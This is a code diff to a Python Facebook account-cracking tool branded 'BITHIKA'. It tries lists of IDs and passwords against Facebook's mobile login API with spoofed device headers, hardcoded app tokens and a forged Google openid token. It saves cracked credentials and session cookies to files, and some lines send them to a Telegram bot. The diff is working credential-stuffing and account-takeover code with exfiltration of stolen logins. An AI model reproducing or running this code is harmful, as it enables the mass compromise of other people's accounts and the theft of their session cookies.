@@ -1711,9 +1711,9 @@ def __MTDONEE__(ids, names, passlist, total_ids):
                 requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                 open('/sdcard/BITHIKA-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                 break
-            elif "User must verify their account" in po:
+            elif "www.facebook.com" in q["error"]["message"]:
                 cps.append(ids)
-                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
+                print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                 open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
@@ -1848,48 +1848,55 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             family_device_id = str(uuid.uuid4())
             advertiser_id = str(uuid.uuid4())
             data = {
-                "adid": f"{adid}",
-                "format": "json",
-                "device_id": f"{device_id}",
-                "cpl": "true",
-                "family_device_id": f"{family_device_id}",
-                "credentials_type": "device_based_login_password",
-                "error_detail_type": "button_with_disabled",
-                "source": "device_based_login",
-                "email": ids,
-                "password": pas,
-                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-                "generate_session_cookies": "1",
-                "meta_inf_fbmeta": "",
-                "advertiser_id": f"{advertiser_id}",
-                "currently_logged_in_userid": "0",
-                "locale": "en_US",
-                "client_country_code": "US",
-                "method": "auth.login",
-                "fb_api_req_friendly_name": "authenticate",
-                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                "api_key": "882a8490361da98702bf97a021ddc14d"}
+            'adid': f"{adid}",
+            'format': 'json',
+            'device_id': f"{device_id}",
+            'family_device_id': f"{family_device_id}",
+            'secure_family_device_id': f"{advertiser_id}",
+            'cpl': 'true',
+            'try_num': '1',
+            'email': uid,
+            'password': pw,
+            'method': 'auth.login',
+            'generate_session_cookies': '1',
+            'sim_serials': "['80973453345210784798']",
+            'openid_flow': 'android_login',
+            'openid_provider': 'google',
+            'openid_emails': "['01710940017']",
+            'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
+            'error_detail_type': 'button_with_disabled',
+            'source': 'account_recovery',
+            'locale': 'en_GB',
+            'client_country_code': 'GB',
+            'fb_api_req_friendly_name': 'authenticate',
+            'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
             headers = [
-                f'User-Agent: {user_agent}',
-                'Content-Type: application/x-www-form-urlencoded',
-                'Host: graph.facebook.com',
-                f'X-FB-Net-HNI: {netheni}',
-                f'X-FB-SIM-HNI: {simheni}',
-                'X-FB-Connection-Type: MOBILE.LTE',
-                'X-Tigon-Is-Retry: False',
-                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                'x-fb-device-group: 5120',
-                'X-FB-Friendly-Name: ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags: graphservice',
-                'X-FB-HTTP-Engine: Liger',
-                'X-FB-Client-IP: True',
-                'X-FB-Server-Cluster: True',
-                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
+            'Host': f'graph.facebook.com',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Priority': 'u=3, i',
+            'X-Fb-Sim-Hni': '45204',
+            'X-Fb-Net-Hni': '45201',
+            'X-Fb-Connection-Quality': 'GOOD',
+            'Zero-Rated': '0',
+            'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'X-Fb-Connection-Bandwidth': '24807555',
+            'X-Fb-Connection-Type': 'MOBILE.LTE',
+            'X-Fb-Device-Group': '5120',
+            'X-Tigon-Is-Retry': 'False',
+            'X-Fb-Friendly-Name': 'authenticate',
+            'X-Fb-Request-Analytics-Tags': 'unknown',
+            'X-Fb-Http-Engine': 'Liger',
+            'X-Fb-Client-Ip': 'True',
+            'X-Fb-Server-Cluster': 'True',
+            'Content-Length': '847'
             ]
-            url = "https://a"+"pi.face"+"book.com/au"+"th/login"
+            url = "https://graph.facebook.com/auth/login"
             buffer = BytesIO()
             c = pycurl.Curl()
-            c.setopt(c.URL, 'https://a'+'pi.faceb'+'ook.com/au'+'th/login')
+            c.setopt(c.URL, 'https://graph.facebook.com/auth/login')
             c.setopt(c.HTTPHEADER, headers)
             c.setopt(c.WRITEDATA, buffer)
             data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
@@ -1903,15 +1910,12 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                 print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
-                cek_apk(kuki)
                 oks.append(ids)
-                statusok = (f" {ids} | {pas} | {kuki} ")
-                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                open('/sdcard/BITHIKA-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
+                open('/sdcard/BITHIKA-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M3-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                 break
-            elif "User must verify their account" in po:
+            elif "www.facebook.com" in q["error"]["message"]:
                 cps.append(ids)
-                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
+                print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                 open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
